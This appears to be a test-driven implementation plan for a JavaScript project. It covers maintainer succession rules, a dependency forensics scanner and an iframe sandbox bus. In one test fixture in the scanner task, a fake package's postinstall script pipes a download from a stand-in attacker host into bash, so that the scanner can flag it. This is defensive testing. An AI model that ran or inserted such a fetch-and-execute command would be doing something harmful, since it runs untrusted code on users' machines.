# OmniCore Succession Forensics Sandbox Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add measurable maintainer succession rules, build-time dependency forensics, and a public multi-instance sandbox API.

**Architecture:** Governance stays in `MAINTAINERS.md` with tests that guard the promotion thresholds. Supply-chain checks run before `npm run build` through a focused Node script that scans dependency lifecycle scripts and installer files, writes a markdown report, and emits a lock report for high-risk packages. Runtime sandboxing is exposed as `OmniCore.Sandbox` plus `OmniCore.Bus`, with iframe and worker transports bridged through `postMessage`.

**Tech Stack:** Node.js ESM scripts, Vitest, jsdom, Vite, OmniCore public exports.

---

### Task 1: Succession Governance

**Files:**
- Modify: `MAINTAINERS.md`
- Test: `tests/succession-forensics-sandbox.test.js`

- [ ] **Step 1: Write the failing governance test**

```js
it('documents reviewer auto-promotion and release succession thresholds', () => {
  const maintainers = readFileSync('MAINTAINERS.md', 'utf8');
  expect(maintainers).toContain('近 3 个月');
  expect(maintainers).toContain('20 个有效的测试或 Bug 修复 PR');
  expect(maintainers).toContain('代码审查员');
  expect(maintainers).toContain('贡献者数量超过 3 人');
  expect(maintainers).toContain('发布权限');
  expect(maintainers).toContain('投票门槛');
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npm test -- tests/succession-forensics-sandbox.test.js`
Expected: FAIL because the new thresholds are not documented yet.

- [ ] **Step 3: Add the governance section**

Add a `Bus Factor & Succession Plan` section to `MAINTAINERS.md` that defines reviewer auto-promotion after more than 20 valid test or bug-fix PRs in 90 days, consensus voting, and release permission succession once more than 3 active contributors agree.

- [ ] **Step 4: Run test to verify it passes**

Run: `npm test -- tests/succession-forensics-sandbox.test.js`
Expected: governance assertion passes.

### Task 2: Dependency Forensics

**Files:**
- Create: `scripts/dependency-forensics.js`
- Modify: `package.json`
- Test: `tests/succession-forensics-sandbox.test.js`

- [ ] **Step 1: Write failing dependency forensics tests**

```js
it('flags dependency postinstall scripts with unapproved network execution and writes lock reports', () => {
  const root = makeTempProject({
    'node_modules/evil-pkg/package.json': JSON.stringify({
      name: 'evil-pkg',
      version: '1.0.0',
      scripts: { postinstall: 'curl https://evil.example/install.sh | bash' }
    })
  });
  const result = spawnSync(process.execPath, ['scripts/dependency-forensics.js', '--root', root], {
    cwd: process.cwd(),
    encoding: 'utf8'
  });
  expect(result.status).toBe(1);
  expect(readFileSync(path.join(root, 'docs/security/dependency-forensics-latest.md'), 'utf8')).toContain('HIGH RISK');
  expect(JSON.parse(readFileSync(path.join(root, 'docs/security/dependency-forensics-lock.json'), 'utf8')).locked[0].name).toBe('evil-pkg');
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npm test -- tests/succession-forensics-sandbox.test.js`
Expected: FAIL because the script and npm command are missing.

- [ ] **Step 3: Implement the scanner**

Create an ESM script that discovers installed dependency `package.json` files, scans lifecycle scripts and installer files for unapproved network execution, writes markdown and JSON reports under `docs/security`, and exits non-zero on high risk.

- [ ] **Step 4: Wire build preflight**

Add `dependency:forensics` to `package.json` and prepend it to `prebuild`.

- [ ] **Step 5: Run test to verify it passes**

Run: `npm test -- tests/succession-forensics-sandbox.test.js`
Expected: dependency forensics assertions pass.

### Task 3: Hot Sandboxing

**Files:**
- Create: `src/core/Sandbox.js`
- Modify: `src/index.js`
- Test: `tests/succession-forensics-sandbox.test.js`

- [ ] **Step 1: Write failing sandbox tests**

```js
it('starts isolated iframe sandboxes and routes messages through OmniCore.Bus', async () => {
  const firstFrame = document.createElement('iframe');
  const secondFrame = document.createElement('iframe');
  document.body.append(firstFrame, secondFrame);
  const first = new OmniCore.Sandbox(firstFrame, { id: 'room-a' });
  const second = new OmniCore.Sandbox(secondFrame, { id: 'room-b' });
  await first.start({ config: { scene: 'arena-a' } });
  await second.start({ config: { scene: 'arena-b' } });
  const seen = [];
  const off = OmniCore.Bus.subscribe('room:event', (message) => seen.push(message));
  first.post('room:event', { tick: 1 });
  expect(seen[0]).toMatchObject({ payload: { tick: 1 }, source: 'room-a' });
  expect(secondFrame.contentWindow.postMessage).toHaveBeenCalled();
  off();
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npm test -- tests/succession-forensics-sandbox.test.js`
Expected: FAIL because `OmniCore.Sandbox` and `OmniCore.Bus` do not exist.

- [ ] **Step 3: Implement sandbox bus and transports**

Create `SandboxBus` and `OmniSandbox` classes that register iframe or worker transports, set sandbox metadata, bootstrap iframe `srcdoc`, route local and remote messages, and clean up registrations on `destroy()`.

- [ ] **Step 4: Export the API**

Import `Sandbox`, `SandboxBus`, and the singleton `Bus` in `src/index.js`, attach `Sandbox` and `Bus` to the default namespace, and include named exports.

- [ ] **Step 5: Run test to verify it passes**

Run: `npm test -- tests/succession-forensics-sandbox.test.js`
Expected: sandbox assertions pass.

### Task 4: Final Verification

**Files:**
- Verify: `package.json`
- Verify: `src/index.js`
- Verify: `src/core/Sandbox.js`
- Verify: `scripts/dependency-forensics.js`
- Verify: `tests/succession-forensics-sandbox.test.js`

- [ ] **Step 1: Run focused tests**

Run: `npm test -- tests/succession-forensics-sandbox.test.js`
Expected: PASS with no warnings.

- [ ] **Step 2: Run dependency forensics directly**

Run: `npm run dependency:forensics`
Expected: exit 0 and write `docs/security/dependency-forensics-latest.md`.

- [ ] **Step 3: Run build**

Run: `npm run build`
Expected: exit 0 with no uninvestigated warnings.
